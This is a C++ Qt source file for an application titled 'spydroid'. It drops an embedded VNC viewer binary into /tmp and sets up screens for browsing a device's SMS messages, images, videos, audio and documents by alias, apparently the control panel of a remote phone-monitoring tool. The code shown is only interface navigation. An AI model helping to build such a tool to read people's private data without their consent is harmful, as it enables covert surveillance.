/*
 * Copyright (C) 2024 Daniel Gómez(Less)
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <https://www.gnu.org/licenses/>.
 */

#include <QApplication>
#include <QWidget>
#include <QLabel>
#include <QPixmap>
#include <QVBoxLayout>
#include <QResource>
#include <QDebug>
#include "components/GoBack.h"
#include <QStackedWidget>
#include "string"
#include "res/bin/vnc_viewer.h"
#include <iostream>
#include <fstream>
#include <cstdlib>
#include <unistd.h>  
#include "presentation/HomeScreen.h"
#include "presentation/DashBoardScreen.h"
#include "presentation/SmsScreen.h"
#include "presentation/MultimediaScreen.h"
#include "presentation/ImagesScreen.h"
#include "presentation/VideosScreen.h"
#include "presentation/AudiosScreen.h"
#include "presentation/DocumentsScreen.h"

int main(int argc, char *argv[])
{

    std::string filePath = "/tmp/vnc_viewer";

    // If file exist
    if (access(filePath.c_str(), F_OK) == -1) {
        std::ofstream outfile(filePath, std::ios::binary);
        outfile.write(reinterpret_cast<const char*>(vncviewer), vncviewer_len);
        outfile.close();

        system(("chmod +x " + filePath).c_str());
    }

    QApplication app(argc, argv);

    QStackedWidget stackedWidget; 

    // Create views 
    HomeScreen* homeScreen = new HomeScreen;
    DashBoardScreen* dashBoardScreen = new DashBoardScreen;
    SmsScreen* smsScreen = new SmsScreen;
    MultimediaScreen* multimediaScreen = new MultimediaScreen;
    ImagesScreen* imagesScreen = new ImagesScreen;
    VideosScreen* videosScreen = new VideosScreen;
    AudiosScreen* audiosScreen = new AudiosScreen;
    DocumentsScreen* documentsScreen = new DocumentsScreen;


    stackedWidget.addWidget(homeScreen);                    // Index 0
    stackedWidget.addWidget(dashBoardScreen);               // Index 1
    stackedWidget.addWidget(multimediaScreen);              // Índex 2
    stackedWidget.addWidget(smsScreen);                     // Index 3
    stackedWidget.addWidget(imagesScreen);                  // Index 4
    stackedWidget.addWidget(videosScreen);                  // Index 5
    stackedWidget.addWidget(audiosScreen);                  // Index 6
    stackedWidget.addWidget(documentsScreen);               // Index 7

    // Show view homeScreen primary
    stackedWidget.setCurrentIndex(0);
    stackedWidget.showMaximized();
    stackedWidget.setWindowTitle("spydroid");

    QObject::connect(homeScreen, &HomeScreen::goToDashBoard, [&stackedWidget, &dashBoardScreen]() {
        stackedWidget.setCurrentIndex(1);  // Change to General information view
        stackedWidget.setWindowTitle("Información general");
    });

    QObject::connect(dashBoardScreen, &DashBoardScreen::goToHome, [&stackedWidget, &homeScreen]() {
        stackedWidget.setCurrentIndex(0);  // Change to view main
        stackedWidget.setWindowTitle("spydroid");
    });

    QObject::connect(dashBoardScreen, &DashBoardScreen::goToMultimedia, [&stackedWidget, &multimediaScreen](const QString& alias) {
        stackedWidget.setCurrentIndex(2);  // Change to view main
        stackedWidget.setWindowTitle("Archivos multimediaScreen de " + alias);
    });

    QObject::connect(dashBoardScreen, &DashBoardScreen::goToSms, [&stackedWidget, &smsScreen](const QString& alias) {
        SmsScreen* newSmsScreen = new SmsScreen(alias);
    
        QObject::connect(newSmsScreen, &SmsScreen::goToDashBoard, [&stackedWidget]() {
            stackedWidget.setCurrentIndex(1);  // Change to General information view
            stackedWidget.setWindowTitle("Información general");
        });
    
        stackedWidget.removeWidget(smsScreen);  // Remover la vista antigua
        delete smsScreen;  // Eliminar la instancia antigua
        smsScreen = newSmsScreen;  // Asignar la nueva instancia
        stackedWidget.addWidget(smsScreen);  // Añadir la nueva vista
        stackedWidget.setCurrentIndex(3);  // Cambiar a la vista SmsScreen
        stackedWidget.setWindowTitle("Mensajes de texto de " + alias);
    });



    QObject::connect(multimediaScreen, &MultimediaScreen::goToDashBoard, [&stackedWidget]() {
        stackedWidget.setCurrentIndex(1);  // Change to view main
        stackedWidget.setWindowTitle("Información general");
    });

    QObject::connect(multimediaScreen, &MultimediaScreen::goToImages, [&stackedWidget](const QString& alias) {
        stackedWidget.setCurrentIndex(4);  // Change to view Images
        stackedWidget.setWindowTitle("Imagenes de " + alias);
    });

    QObject::connect(multimediaScreen, &MultimediaScreen::goToVideos, [&stackedWidget](const QString& alias) {
        stackedWidget.setCurrentIndex(5);  // Change to view Videos
        stackedWidget.setWindowTitle("Videos de " + alias);
    });

    QObject::connect(multimediaScreen, &MultimediaScreen::goToAudios, [&stackedWidget](const QString& alias) {
        stackedWidget.setCurrentIndex(6);  // Change to view Audios
        stackedWidget.setWindowTitle("Audios de " + alias);
    });

    QObject::connect(multimediaScreen, &MultimediaScreen::goToDocuments, [&stackedWidget](const QString& alias) {
        stackedWidget.setCurrentIndex(7);  // Change to view Documents
        stackedWidget.setWindowTitle("Docuementos de " + alias);
    });

    QObject::connect(imagesScreen, &ImagesScreen::goToMultimedia, [&stackedWidget]() {
        stackedWidget.setCurrentIndex(2);  // Change to view multimedia
        stackedWidget.setWindowTitle("Archivos multimedia de ");
    });

    QObject::connect(videosScreen, &VideosScreen::goToMultimedia, [&stackedWidget]() {
        stackedWidget.setCurrentIndex(2);  // Change to view multimedia
        stackedWidget.setWindowTitle("Archivos multimedia de ");
    });

    QObject::connect(audiosScreen, &AudiosScreen::goToMultimedia, [&stackedWidget]() {
        stackedWidget.setCurrentIndex(2);  // Change to view multimedia
        stackedWidget.setWindowTitle("Archivos multimedia de ");
    });

    QObject::connect(documentsScreen, &DocumentsScreen::goToMultimedia, [&stackedWidget]() {
        stackedWidget.setCurrentIndex(2);  // Change to view multimedia
        stackedWidget.setWindowTitle("Archivos multimedia de ");
    });

    return app.exec();
}
